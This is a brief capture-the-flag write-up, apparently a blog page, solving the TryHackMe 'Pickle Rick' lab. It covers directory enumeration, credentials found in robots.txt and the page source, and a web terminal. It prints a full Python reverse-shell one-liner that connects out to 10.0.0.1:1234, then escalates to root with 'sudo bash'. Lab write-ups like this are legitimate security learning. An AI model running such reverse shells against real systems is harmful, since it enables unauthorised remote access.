---
title: Pickle Rick
permalink: pickleRick
---
# ![front](saharshtapi.github.io/images/pickleRick/front.png)
[https://tryhackme.com/room/picklerick](https://tryhackme.com/room/picklerick)

## Open Ports:
  - 21: ssh
  - 80: HTTP
  
## Port 80:
1. find sub-doamisn and directories usind **dirb** + **dirbuster**
   - ip/robots.txt **(we find passwd)**
   - ip/index **(username in the source Page)**
   - ip/portal.php **(found username and password)**
   
## Gaining Access:
 **We find a terminal inside the website**
 - Add the python reverse shell command 
    >python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 - listening via netcat will gain you access to the **BOX**
### 1st Flag:
![user_flag](saharshtapi.github.io/images/Pickle Rick/1st.png)
### 2nd Flag:
![user_flag](saharshtapi.github.io/images/Pickle Rick/2nd.png) 


## Privilege Escalation:
 - sudo -l
    - All users are sudp 
      > 'sudo bash'
    
### 3rd Flag:
![rootflag.png](saharshtapi.github.io/images/lazyAdmin/3rd.png)
